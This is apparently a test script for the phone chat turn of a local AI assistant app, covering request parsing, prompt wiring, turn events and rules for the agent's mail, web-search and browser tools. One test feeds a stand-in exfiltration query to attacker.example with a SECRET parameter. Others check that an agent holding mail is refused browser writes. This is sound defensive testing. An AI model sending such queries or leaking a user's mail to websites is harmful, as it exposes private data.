// The phone chat's turn, driven through the real modules: request parsing, the
// wire a phone turn sends, and the events one turn makes from a fake loop.
// The mail read and the runner are in phone-chat-runner.mjs.
//
// Run: node scripts/phone-chat-turn.mjs   (from chat/)

import { createServer } from "node:http";
import {
  BROWSER_CARD,
  BROWSER_OUTCOME,
  CARDS,
  DRAFT,
  MAIL_OFF,
  MAIL_ON,
  bridge,
  NOW,
  PHONE,
  SETTINGS,
  USER,
  check,
  equal,
  facts,
  fakeLoop,
  recorder,
  summary,
  terminals,
  turnOf,
  withPhone,
} from "./lib/phone-harness.mjs";

function requests(app) {
  console.log("\n# request parsing");
  const { readPhoneRequest, requestIdOf } = app;
  equal(
    "a turn parses with its reply and language",
    readPhoneRequest({ request: "r1", kind: "turn", mail: true, turn: { messages: [USER("hi")], reply_for: "105", language: "it" } }),
    { request: "r1", mail: true, device: null, body: { kind: "turn", turn: { messages: [USER("hi")], replyFor: "105", language: "it", device: null } } },
  );
  equal(
    "a payload that says nothing about the mailbox reads as closed",
    readPhoneRequest({ request: "r3", kind: "turn", turn: { messages: [USER("hi")] } }),
    { request: "r3", mail: false, device: null, body: { kind: "turn", turn: { messages: [USER("hi")], replyFor: null, language: "en", device: null } } },
  );
  equal(
    "the device comes from beside the turn, which the app put there from the credential",
    readPhoneRequest({ request: "r4", device: "2", kind: "turn", turn: { messages: [USER("hi")], language: "en" } }),
    { request: "r4", mail: false, device: "2", body: { kind: "turn", turn: { messages: [USER("hi")], replyFor: null, language: "en", device: null } } },
  );
  equal(
    "and a turn that names another phone in its body cannot move it",
    readPhoneRequest({ request: "r6", device: "2", mail: true, kind: "turn", turn: { messages: [USER("hi")], language: "en", device: "7" } }),
    { request: "r6", mail: true, device: "2", body: { kind: "turn", turn: { messages: [USER("hi")], replyFor: null, language: "en", device: null } } },
    "the body's number is read by nobody: the app's own is the only one that reaches the turn",
  );
  equal(
    "a device that is not a number is no device at all",
    readPhoneRequest({ request: "r5", kind: "turn", turn: { messages: [USER("hi")] }, device: "phone:2" }).device,
    null,
  );
  equal(
    "a turn without reply or language defaults to no mail and English",
    readPhoneRequest({ request: "r2", kind: "turn", turn: { messages: [USER("hi")] } }).body.turn,
    { messages: [USER("hi")], replyFor: null, language: "en", device: null },
  );
  const bad = [
    ["no kind", { request: "b1", turn: { messages: [USER("x")] } }],
    ["unknown role", { request: "b2", kind: "turn", turn: { messages: [{ role: "system", content: "x" }] } }],
    ["content is not text", { request: "b3", kind: "turn", turn: { messages: [{ role: "user", content: [{ type: "text", text: "x" }] }] } }],
    ["ends on the model's words", { request: "b4", kind: "turn", turn: { messages: [USER("x"), { role: "assistant", content: "y" }] } }],
    ["reply_for not digits", { request: "b5", kind: "turn", turn: { messages: [USER("x")], reply_for: "10a" } }],
    ["reply_for a number", { request: "b6", kind: "turn", turn: { messages: [USER("x")], reply_for: 105 } }],
    ["language fr", { request: "b7", kind: "turn", turn: { messages: [USER("x")], language: "fr" } }],
    ["201 messages", { request: "b8", kind: "turn", turn: { messages: Array.from({ length: 201 }, () => USER("x")) } }],
    ["no messages", { request: "b9", kind: "turn", turn: { messages: [] } }],
  ];
  for (const [label, payload] of bad) {
    const envelope = readPhoneRequest(payload);
    check(`bad payload is answered, not parsed: ${label}`, envelope !== null && envelope.body === null, JSON.stringify(envelope));
  }
  check("a payload with no id is dropped", readPhoneRequest({ kind: "turn" }) === null && readPhoneRequest(null) === null);
  check("an empty id is dropped", readPhoneRequest({ request: "", kind: "read", read: { id: "1" } }) === null);
  check("the stop's id is read", requestIdOf({ request: "s1" }) === "s1" && requestIdOf({}) === null);
}

function wire(app) {
  console.log("\n# the wire");
  const convo = [USER("che mail ho?"), { role: "assistant", content: "Due." }, USER("rispondi al primo")];
  const plain = app.phoneWire(turnOf(convo), { vision: false, think: false, nctx: 8192 }, NOW);
  // The phone is offered no mini app and draws none, so its prompt is the
  // desktop's own minus the two sentences about building one — every other byte
  // is the desktop's, or the engine's cache would prefill two prompts.
  equal("the system message is the desktop's own prompt, without the mini app sentences", plain.wire[0], {
    role: "system",
    content: app.systemPrompt(false, false).content.replace(
      /Use create_miniapp[^.]*\. |Miniapps \(a table, calculator, quiz or checklist\) open inline in the chat\. /g,
      "",
    ),
  });
  check(
    "the phone's prompt names no mini app",
    !plain.wire[0].content.includes("create_miniapp") && !plain.wire[0].content.includes("Miniapps ("),
    JSON.stringify(plain.wire[0].content.slice(0, 200)),
  );
  equal("only the last words carry the send date", plain.wire.slice(1).map((m) => m.content), [
    "che mail ho?",
    "Due.",
    `rispondi al primo\n\nSent on ${app.sentDatePhrase(NOW)}.`,
  ]);
  const reply = app.phoneWire(turnOf(convo, { replyFor: "105", language: "it" }), { vision: false, think: false, nctx: 8192 }, NOW);
  equal("a reply pins the last words to its mail, in the phone's language", reply.wire.at(-1).content, [
    app.TABLES.it.mail.askDraftNote("105"),
    `rispondi al primo\n\nSent on ${app.sentDatePhrase(NOW)}.`,
  ].join("\n\n"));
  check(
    "vision follows the engine's answer",
    app.phoneWire(turnOf(convo), { vision: true, think: false, nctx: null }, NOW).wire[0].content.includes(
      "Images the user attaches reach you as images",
    ),
  );
  equal("an unknown window leaves the wire unpruned", app.phoneWire(turnOf(convo), { vision: false, think: false, nctx: null }, NOW).status, "ok");
}

async function turns(app) {
  console.log("\n# the turn and its events");
  const abortable = () => new AbortController().signal;
  {
    const { loop, seen } = fakeLoop(async (o) => {
      o.outcome = await o.runTool("mail_draft", { reply_to_id: "999", body: "x" }, o.signal, o.messages);
    });
    const { log, sink } = recorder(app);
    await app.runPhoneTurn(turnOf([USER("rispondi")], { replyFor: "105" }), SETTINGS, sink, abortable(), MAIL_ON, { loop, facts: facts() });
    check("a reply turn passes its mail to the loop's draft check", seen.options.messages.at(-1).content.startsWith(app.TABLES.en.mail.askDraftNote("105")));
    check(
      "a draft for another mail is refused by the turn's pin",
      seen.options.outcome?.ok === false && seen.options.outcome.text.includes("this turn is for the mail with id 105"),
      JSON.stringify(seen.options.outcome),
    );
    equal("a finished turn ends with one done", log.at(-1), ["done", {}]);
  }
  {
    const { loop, seen } = fakeLoop(async () => {});
    const { sink } = recorder(app);
    await app.runPhoneTurn(turnOf([USER("x")]), SETTINGS, sink, abortable(), MAIL_ON, { loop, facts: facts() });
    const names = seen.options.tools.map((t) => t.function.name);
    check(
      "the tools are the desktop's, without create_miniapp",
      !names.includes("create_miniapp") && names.includes("web_search") && names.includes("mail_list"),
      JSON.stringify(names),
    );
  }
  {
    // The switch is off for this phone: the whole mailbox goes, `mail_show`
    // with it, because that one draws the cards on this computer. What the
    // phone can still do stays — refusing mail is not refusing the turn.
    const { loop, seen } = fakeLoop(async () => {});
    const { log, sink } = recorder(app);
    await app.runPhoneTurn(turnOf([USER("fammi vedere le mail")]), SETTINGS, sink, abortable(), MAIL_OFF, {
      loop,
      facts: facts(),
    });
    const names = seen.options.tools.map((t) => t.function.name);
    check(
      "a phone switched off the mailbox is offered none of it",
      ["mail_list", "mail_read", "mail_draft", "mail_show"].every((name) => !names.includes(name)),
      JSON.stringify(names),
    );
    check(
      "and keeps the tools it was always offered",
      names.includes("web_search") && !names.includes("create_miniapp"),
      JSON.stringify(names),
    );
    equal("the turn itself still answers", log.at(-1), ["done", {}]);
  }
  {
    const { loop } = fakeLoop(async (o) => {
      o.onToolRun({ id: "0-c1", name: "mail_list", arguments: "{}", result: "", state: "running" });
      o.onToolRun({ id: "0-c1", name: "mail_list", arguments: "{}", result: "1 mail", state: "ok", mail: CARDS });
      o.onToolRun({ id: "0-c1", name: "mail_list", arguments: "{}", result: "1 mail", state: "ok", mail: CARDS });
      o.onToken("Ecco.");
    });
    const { log, sink } = recorder(app);
    await app.runPhoneTurn(turnOf([USER("mail")]), SETTINGS, sink, abortable(), MAIL_ON, { loop, facts: facts() });
    // A repeated report re-sends its row (the state is the same), never a second card set.
    // The cards follow the answer that introduces them, as on the desktop: the
    // phone draws them under the first word, and a turn with no word at all
    // still sends them before its terminal frame.
    equal("a tool run with cards is a tool_run, then the cards once the answer starts", log, [
      ["tool_run", { id: "0-c1", name: "mail_list", state: "running" }],
      ["tool_run", { id: "0-c1", name: "mail_list", state: "ok" }],
      ["tool_run", { id: "0-c1", name: "mail_list", state: "ok" }],
      ["delta", { text: "Ecco." }],
      ["cards", CARDS],
      ["done", {}],
    ]);
    // Every field of a card and of its labels is one word, so the cards frame
    // has no camelCase to fix — the read frame's `threadIds` was the only one.
    const keys = Object.keys(CARDS).concat(Object.keys(CARDS.items[0]), Object.keys(CARDS.items[0].labels));
    check("the cards frame is snake_case already", !keys.some((key) => /[A-Z]/.test(key)), keys.join(", "));
  }
  {
    const { loop } = fakeLoop(async (o) => {
      o.onToolRun({ id: "0-d1", name: "mail_draft", arguments: "{}", result: "Draft written.", state: "ok", mail: DRAFT });
    });
    const { log, sink } = recorder(app);
    await app.runPhoneTurn(turnOf([USER("rispondi")], { replyFor: "105" }), SETTINGS, sink, abortable(), MAIL_ON, { loop, facts: facts() });
    equal("a draft is sent in the protocol's snake_case, with no send", log[1], [
      "draft",
      { reply_to_id: "105", to: "ann@example.com", to_name: "", subject: "Re: Hi", body: "Ciao" },
    ]);
  }
  {
    const { loop } = fakeLoop(async () => {});
    const { log, sink } = recorder(app);
    await app.runPhoneTurn(turnOf([USER("x")]), SETTINGS, sink, abortable(), MAIL_ON, { loop, facts: facts() });
    sink.fail("engine");
    sink.delta("late");
    check("exactly one terminal event, and nothing after it", terminals(log) === 1 && log.length === 1, JSON.stringify(log));
  }
  {
    // A turn whose answer never arrives must still deliver the cards: the
    // phone's frames are one way, so a held card is only ever held until the
    // turn's terminal frame, never dropped.
    const { loop } = fakeLoop(async (o) => {
      o.onToolRun({ id: "0-c1", name: "mail_list", arguments: "{}", result: "1 mail", state: "ok", mail: CARDS });
      throw new app.ChatRequestError("http", "HTTP 500");
    });
    const { log, sink } = recorder(app);
    await app.runPhoneTurn(turnOf([USER("fammi vedere le mail")]), SETTINGS, sink, abortable(), MAIL_ON, { loop, facts: facts() });
    equal("a turn with no answer still sends its cards before it ends", log.at(-2)[0], "cards");
    equal("and then the turn's own code", log.at(-1), ["error", { code: "engine" }]);
  }
  {
    const { loop } = fakeLoop(async (o) => {
      o.onToolRun({ id: "0-c1", name: "mail_list", arguments: "{}", result: "1 mail", state: "ok", mail: CARDS });
    });
    const { log, sink } = recorder(app);
    await app.runPhoneTurn(turnOf([USER("fammi vedere le mail")]), SETTINGS, sink, abortable(), MAIL_ON, { loop, facts: facts() });
    equal("a turn that says nothing sends its cards before done", log.at(-2)[0], "cards");
    equal("and then done", log.at(-1), ["done", {}]);
  }
  {
    const { loop } = fakeLoop(async () => {
      throw new app.ChatRequestError("http", "HTTP 500");
    });
    const { log, sink } = recorder(app);
    await app.runPhoneTurn(turnOf([USER("x")]), SETTINGS, sink, abortable(), MAIL_ON, { loop, facts: facts() });
    equal("an engine failure is the engine's code", log, [["error", { code: "engine" }]]);
  }
  {
    const { loop } = fakeLoop(async () => {
      throw new app.ChatRequestError("oversize", "Context exceeded");
    });
    const { log, sink } = recorder(app);
    await app.runPhoneTurn(turnOf([USER("x")]), SETTINGS, sink, abortable(), MAIL_ON, { loop, facts: facts() });
    equal("a window too small for the turn is bad_request", log, [["error", { code: "bad_request" }]]);
  }
  {
    const controller = new AbortController();
    const { loop } = fakeLoop(
      (o) =>
        new Promise((_, reject) =>
          o.signal.addEventListener("abort", () => reject(new app.ChatRequestError("aborted", "Stopped"))),
        ),
    );
    const { log, sink } = recorder(app);
    const running = app.runPhoneTurn(turnOf([USER("x")]), SETTINGS, sink, controller.signal, MAIL_ON, { loop, facts: facts() });
    setTimeout(() => controller.abort(), 5);
    await running;
    equal("a stop ends the turn as cancelled, once", log, [["error", { code: "cancelled" }]]);
  }
  {
    const { loop, seen } = fakeLoop(async () => {});
    const { log, sink } = recorder(app);
    await app.runPhoneTurn(turnOf([USER("x")]), { ...SETTINGS, endpoint: "" }, sink, abortable(), MAIL_ON, { loop, facts: facts() });
    equal("no door means an engine error and no call", [seen.options, log], [null, [["error", { code: "engine" }]]]);
  }
  {
    const { loop, seen } = fakeLoop(async () => {});
    const { log, sink } = recorder(app);
    await app.runPhoneTurn(turnOf([USER("x".repeat(4000))]), SETTINGS, sink, abortable(), MAIL_ON, { loop, facts: facts({ nctx: 100 }) });
    equal("a turn the window cannot hold is refused before the call", [seen.options, log], [null, [["error", { code: "bad_request" }]]]);
  }
}

/** The phone's reasoning of a refused round, through the REAL loop: a server
    that answers with the rounds it is given, one per request. The phone's
    frames are one way, so round one's reasoning can only be sent if round one
    stands. */
function scriptedBrain(rounds) {
  const cors = {
    "Access-Control-Allow-Origin": "*",
    "Access-Control-Allow-Methods": "POST, OPTIONS",
    "Access-Control-Allow-Headers": "content-type, authorization, x-kalsa-request",
  };
  let round = 0;
  const open = [];
  const server = createServer((req, res) => {
    if (req.method === "OPTIONS") return void res.writeHead(204, cors).end();
    req.resume();
    res.writeHead(200, { "content-type": "text/event-stream", ...cors });
    open.push(res);
    const script = rounds[Math.min(round, rounds.length - 1)];
    round += 1;
    const chunks = Array.isArray(script) ? script : script.chunks;
    for (const delta of chunks) res.write(`data: ${JSON.stringify({ choices: [{ delta }] })}\n\n`);
    // A round the test holds open: the stream stays open until the turn stops.
    if (!Array.isArray(script)) return;
    res.write("data: [DONE]\n\n");
    res.end();
  });
  return {
    async listen() {
      await new Promise((ready) => server.listen(0, "127.0.0.1", ready));
      return `http://127.0.0.1:${server.address().port}`;
    },
    close: () => {
      for (const res of open) res.end();
      server.close();
    },
  };
}

const think = (text) => ({ reasoning_content: text });
const say = (text, finish = "stop") => ({ content: text, finish_reason: finish });

async function refusedReasoning(app) {
  console.log("\n# the reasoning of a refused round");
  const abortable = () => new AbortController().signal;
  // Round one refuses, so the loop asks again without tools: the reasoning of
  // round one is never sent, and the retry's is.
  {
    const brain = scriptedBrain([
      [think("Cerco gli strumenti."), say("Non posso aiutarti con questa richiesta.")],
      [think("Provo senza strumenti."), say("Ecco cosa posso fare.")],
    ]);
    const settings = { ...SETTINGS, endpoint: await brain.listen() };
    const { log, sink } = recorder(app);
    await app.runPhoneTurn(turnOf([USER("fammi vedere le mail")]), settings, sink, abortable(), MAIL_ON, { loop: app.streamChatCompletion, facts: facts() });
    equal("the refused round's reasoning never reaches the phone", log.filter(([event]) => event === "reasoning"), [
      ["reasoning", { text: "Provo senza strumenti." }],
    ]);
    equal("and the retry's answer follows it", log.at(-2), ["delta", { text: "Ecco cosa posso fare." }]);
    equal("the turn still ends once", log.at(-1), ["done", {}]);
    brain.close();
  }
  // A round that stands sends its reasoning, in order, before its answer.
  {
    const brain = scriptedBrain([[think("Guardo le mail."), say("Due mail sono arrivate.")]]);
    const settings = { ...SETTINGS, endpoint: await brain.listen() };
    const { log, sink } = recorder(app);
    await app.runPhoneTurn(turnOf([USER("fammi vedere le mail")]), settings, sink, abortable(), MAIL_ON, { loop: app.streamChatCompletion, facts: facts() });
    equal("a round that stands sends its reasoning before its answer", log, [
      ["reasoning", { text: "Guardo le mail." }],
      ["delta", { text: "Due mail sono arrivate." }],
      ["done", {}],
    ]);
    brain.close();
  }
  // The last round of a turn — asked for in words, after tools are spent — is
  // not a round that can be refused, so nothing is held and both streams live.
  {
    const brain = scriptedBrain([[say("")], [think("Scrivo senza strumenti."), say("Ecco cosa posso fare.")]]);
    const settings = { ...SETTINGS, endpoint: await brain.listen() };
    const { log, sink } = recorder(app);
    await app.runPhoneTurn(turnOf([USER("fammi vedere le mail")]), settings, sink, abortable(), MAIL_ON, { loop: app.streamChatCompletion, facts: facts() });
    // The empty round settles as an empty frame, which shows nothing; it is
    // left out so this reads about the last round's own two frames.
    const said = log.filter(([event, data]) => !(event === "delta" && data.text === ""));
    equal("the last round's reasoning is not held back", said, [
      ["reasoning", { text: "Scrivo senza strumenti." }],
      ["delta", { text: "Ecco cosa posso fare." }],
      ["done", {}],
    ]);
    brain.close();
  }
  // Stopped mid-hold: the round never stands, so nothing it held is sent.
  {
    const brain = scriptedBrain([{ chunks: [think("Guardo le mail."), say("Due mail sono arrivate")] }]);
    const settings = { ...SETTINGS, endpoint: await brain.listen() };
    const { log, sink } = recorder(app);
    const controller = new AbortController();
    const running = app.runPhoneTurn(turnOf([USER("fammi vedere le mail")]), settings, sink, controller.signal, MAIL_ON, { loop: app.streamChatCompletion, facts: facts() });
    await new Promise((r) => setTimeout(r, 300));
    controller.abort();
    await running;
    equal("a round stopped mid-hold sends no reasoning at all", log.filter(([event]) => event === "reasoning"), []);
    equal("and the turn ends as cancelled", log.at(-1), ["error", { code: "cancelled" }]);
    brain.close();
  }
  // The chat can take a frame back, so it keeps streaming: the hold is the
  // phone's, not the loop's.
  {
    const brain = scriptedBrain([[think("Cerco gli strumenti."), say("Non posso aiutarti con questa richiesta.")]]);
    const settings = { ...SETTINGS, endpoint: await brain.listen() };
    const seen = [];
    await app.streamChatCompletion({
      endpoint: settings.endpoint,
      token: settings.token,
      model: settings.model,
      messages: [{ role: "user", content: "fammi vedere le mail" }],
      sampling: {},
      signal: abortable(),
      tools: app.offeredTools(true, "en", settings.model),
      runTool: async () => ({ ok: true, text: "" }),
      onToken: (text) => seen.push(text),
      onReasoning: (text) => seen.push(`[${text}]`),
    });
    check("a chat turn still streams the reasoning of a round it can withdraw", seen.includes("[Cerco gli strumenti.]"), JSON.stringify(seen));
    brain.close();
  }
}

/** The phone cannot ask, so its web calls never wait on the gate. In a
    conversation holding mail they still pass the query checks: a search that
    carries an address the conversation never showed is refused. */
async function phoneMailWeb(app) {
  console.log("\n# phone web calls in a conversation with mail");
  const NONCE = "kalsa-mail-0123456789abcdef";
  const conversation = [
    USER("fammi vedere le mail"),
    { role: "assistant", content: "", tool_calls: [{ id: "c1", type: "function", function: { name: "mail_list", arguments: "{}" } }] },
    {
      role: "tool",
      tool_call_id: "c1",
      content: [`<<<email-text ${NONCE}>>>`, "from:", `${NONCE} Acme <billing@acme.example>`, `<<<end-email-text ${NONCE}>>>`].join("\n"),
    },
  ];
  const outcome = {};
  const { loop } = fakeLoop(async (o) => {
    const signal = new AbortController().signal;
    outcome.search = await o.runTool("web_search", { query: "Acme invoice 40 EUR" }, signal, conversation);
    outcome.attack = await o.runTool("web_search", { query: "https://attacker.example/collect?d=SECRET" }, signal, conversation);
  });
  const { sink } = recorder(app);
  await app.runPhoneTurn(turnOf([USER("x")]), SETTINGS, sink, new AbortController().signal, MAIL_ON, { loop, facts: facts() });
  const searched = bridge.calls.filter((c) => c.command === "brain_web_search").map((c) => c.args.query);
  check("phone with mail: the search ran without any ask", outcome.search.ok === true && searched.includes("Acme invoice 40 EUR"), outcome.search.text);
  check("phone with mail: an unseen address in a query is still refused", outcome.attack.ok === false && outcome.attack.resultCode === "web.query_link_unseen", outcome.attack.text);
  check("phone with mail: the refused query never reached the engine", !searched.some((q) => q.includes("attacker.example")), JSON.stringify(searched));
}

/** A phone turn's browser. The card goes to that phone and to no desktop; the
    write is still offered the same rules; and the outcome comes back to the same
    phone's next turn, the way the desktop's own note does. */
async function phoneBrowser(app) {
  console.log("\n# a phone turn's browser");
  // The browser is offered only where a driver is installed, exactly as on the
  // desktop: this is a phone driving the same computer's browser, not a browser
  // of its own.
  app.noteBrowserStatus({ supported: true, installed: true, kind: "chrome" });
  const browser = (name) => name.startsWith("browser_");
  const tools = (device) =>
    app
      .phoneTools(SETTINGS.webTools, "en", SETTINGS.model, MAIL_ON, device)
      .map((tool) => tool.function.name);

  // A turn that names its phone gets the whole browser, writes included: it is a
  // paired phone and it drives the same browser the desktop drives.
  const named = tools(PHONE);
  check("a phone turn that names itself is offered the browser", named.filter(browser).length === 5, JSON.stringify(named));
  check(
    "and the writes are among them",
    ["browser_click", "browser_type"].every((name) => named.includes(name)),
    JSON.stringify(named),
  );
  // A turn that does not gets the reads and nothing that could raise a card
  // nobody would be shown.
  const anonymous = tools(null);
  check(
    "a turn that names no phone is offered the reads and no writes",
    anonymous.filter(browser).every((name) => !["browser_click", "browser_type"].includes(name)),
    JSON.stringify(anonymous),
  );
  check("and it keeps no mini app either", !anonymous.includes("create_miniapp"), JSON.stringify(anonymous));

  // The conversation is the phone's, one per device, and never a desktop's: a
  // desktop conversation is a UUID, so the two can never be the same string.
  const conversation = app.phoneConversation(PHONE);
  check("the conversation is this phone's own", conversation === `phone:${PHONE}`, conversation);
  check("and a different phone is a different conversation", app.phoneConversation("3") !== conversation);

  // The browser call this turn makes is stamped with that conversation, so the
  // card it raises comes back to this phone and not to a chat.
  const { loop } = fakeLoop(async (o) => {
    const signal = new AbortController().signal;
    await o.runTool("browser_click", { ref: "e4" }, signal, undefined);
  });
  const { sink } = recorder(app);
  await app.runPhoneTurn(turnOf([USER("buy it")], { device: PHONE }), SETTINGS, sink, new AbortController().signal, MAIL_ON, {
    loop,
    facts: facts(),
  });
  const clicked = bridge.calls.filter((c) => c.command === "brain_browser_click");
  check(
    "so the click carries this phone's conversation",
    clicked.length === 1 && clicked[0].args.conversation === conversation,
    JSON.stringify(clicked.map((c) => c.args.conversation)),
  );

  // **The outcome reaches the model in this phone's next turn.** It is queued
  // under the phone's conversation and drained into the browser note, and the
  // note rides the last user message like the desktop's own.
  app.noteAnswered({ id: BROWSER_CARD.card_id, conversation, code: "sent", host: "shop.example" });
  let wire2 = null;
  const second = fakeLoop(async (o) => {
    wire2 = o.messages;
  });
  await app.runPhoneTurn(turnOf([USER("did it go?")], { device: PHONE }), SETTINGS, recorder(app).sink, new AbortController().signal, MAIL_ON, {
    loop: second.loop,
    facts: facts(),
  });
  const last = wire2[wire2.length - 1];
  check(
    "the phone's next turn is told what became of it",
    typeof last.browserNote === "string" && last.browserNote.includes("shop.example") && /allowed the request/.test(last.browserNote),
    JSON.stringify(last.browserNote),
  );
  // And the note is the app's own account: it says where the request went and
  // nothing of what it held, so a phone's next turn cannot carry a form's fields.
  check(
    "without repeating the card, or any field of it",
    !last.browserNote.includes(BROWSER_CARD.card_id) && !last.browserNote.includes("hunter2"),
    JSON.stringify(last.browserNote),
  );
  // And it is told once: drained, not repeated on every turn afterwards.
  let wire3 = null;
  await app.runPhoneTurn(turnOf([USER("and now?")], { device: PHONE }), SETTINGS, recorder(app).sink, new AbortController().signal, MAIL_ON, {
    loop: fakeLoop(async (o) => {
      wire3 = o.messages;
    }).loop,
    facts: facts(),
  });
  check("and only once", wire3[wire3.length - 1].browserNote === undefined, JSON.stringify(wire3[wire3.length - 1].browserNote));

  // **A phone holding its owner's mail does not type into a website.** Not the
  // card — a card is a request the person is asked about, and a page navigation
  // needs none: a click that goes somewhere, or a search box the model fills and
  // presses Enter on, leaves the computer with nothing on a screen for the owner
  // to say yes to. On the desktop the answer is a gate and an ask; a phone has
  // nobody to ask, so the answer is one plain line.
  // A conversation that has read mail, in the shape the loop's own answers have:
  // a mail tool's answer, and a tool answer carrying the sidecar's fence — which
  // is what the rule reads, on the desktop as much as here.
  const NONCE = "0123456789abcdef";
  const MAIL_TURN = [
    { role: "assistant", content: "", tool_calls: [{ id: "m1", type: "function", function: { name: "mail_list", arguments: "{}" } }] },
    {
      role: "tool",
      tool_call_id: "m1",
      content: `<<<mail\nsubject:\nkalsa-mail-${NONCE} Your statement\n<<<`,
    },
  ];
  check("a turn whose conversation holds mail is armed", app.phoneArmed(MAIL_TURN) === true);
  check(
    "and a turn that reads no mail is not",
    app.phoneArmed([{ role: "user", content: "buy it" }]) === false,
    "the same conversation with no mail in it",
  );

  const armedTools = app
    .phoneTools(SETTINGS.webTools, "en", SETTINGS.model, MAIL_ON, PHONE, true)
    .map((tool) => tool.function.name);
  check(
    "so an armed phone is offered the browser's reads and neither of its writes",
    ["browser_open", "browser_read"].every((name) => armedTools.includes(name)) &&
      !["browser_click", "browser_type"].some((name) => armedTools.includes(name)),
    JSON.stringify(armedTools.filter(browser)),
  );

  // **And refused when it calls one anyway.** An offer is something the model can
  // write past: the tool list is chosen before the first mail arrives, and a turn
  // can name a tool it was never offered.
  let refused = null;
  const { loop: refusingLoop } = fakeLoop(async (o) => {
    const signal = new AbortController().signal;
    refused = await o.runTool("browser_type", { ref: "e4", text: "482913" }, signal, MAIL_TURN);
  });
  const { sink: armedSink } = recorder(app);
  await app.runPhoneTurn(
    turnOf([USER("search for 482913")], { device: PHONE }),
    SETTINGS,
    armedSink,
    new AbortController().signal,
    MAIL_ON,
    { loop: refusingLoop, facts: facts() },
  );
  check(
    "a write in an armed chat is refused in one plain line, and nothing was sent",
    refused !== null &&
      refused.ok === false &&
      refused.text.includes("won't type into a website") &&
      refused.text.includes("mail or documents"),
    JSON.stringify(refused),
  );
  check(
    "and the sidecar was never asked",
    !bridge.calls.some((c) => c.command === "brain_browser_type"),
    JSON.stringify(bridge.calls.map((c) => c.command)),
  );

  // **And the latch: once a mail tool has run in a turn, the turn stays armed.**
  // The conversation predicate reads the wire the loop is given, and a wire can
  // stop saying so — trimmed to fit, a mail result cut by the context budget, an
  // answer that came back as an error rather than fenced mail. None of those
  // un-reads the mail: the model has it, and may have it in the very round it is
  // answering from. So the mail tool is run first and the write is refused
  // anyway, on a conversation that shows nothing.
  const trimmed = [{ role: "user", content: "find it" }];
  let after_mail = null;
  const { loop: latchingLoop } = fakeLoop(async (o) => {
    const signal = new AbortController().signal;
    await o.runTool("mail_read", { id: "105" }, signal, trimmed);
    after_mail = await o.runTool("browser_type", { ref: "e4", text: "482913" }, signal, trimmed);
  });
  const sent_before = bridge.calls.filter((c) => c.command === "brain_browser_type").length;
  await app.runPhoneTurn(turnOf([USER("read it, then search")], { device: PHONE }), SETTINGS, recorder(app).sink, new AbortController().signal, MAIL_ON, {
    loop: latchingLoop,
    facts: facts(),
  });
  check(
    "a write after a mail tool in the same turn is refused, on a wire that shows no mail",
    after_mail !== null && after_mail.ok === false && after_mail.text.includes("won't type into a website"),
    JSON.stringify(after_mail),
  );
  check(
    "and the sidecar is still never asked",
    bridge.calls.filter((c) => c.command === "brain_browser_type").length === sent_before,
    "the type that went out before the latch test is all of them",
  );

  // The same call in a chat holding no mail still goes through: the rule is about
  // what the conversation holds, not about phones.
  const { loop: freeLoop } = fakeLoop(async (o) => {
    await o.runTool("browser_type", { ref: "e4", text: "482913" }, new AbortController().signal, [{ role: "user", content: "hi" }]);
  });
  await app.runPhoneTurn(turnOf([USER("search for 482913")], { device: PHONE }), SETTINGS, recorder(app).sink, new AbortController().signal, MAIL_ON, {
    loop: freeLoop,
    facts: facts(),
  });
  check(
    "while an unarmed one is not, because a browser is a place things go out to",
    bridge.calls.some((c) => c.command === "brain_browser_type"),
    JSON.stringify(bridge.calls.map((c) => c.command)),
  );
}

await withPhone(async (app) => {
  requests(app);
  wire(app);
  await turns(app);
  await refusedReasoning(app);
  await phoneMailWeb(app);
  await phoneBrowser(app);
});
summary();
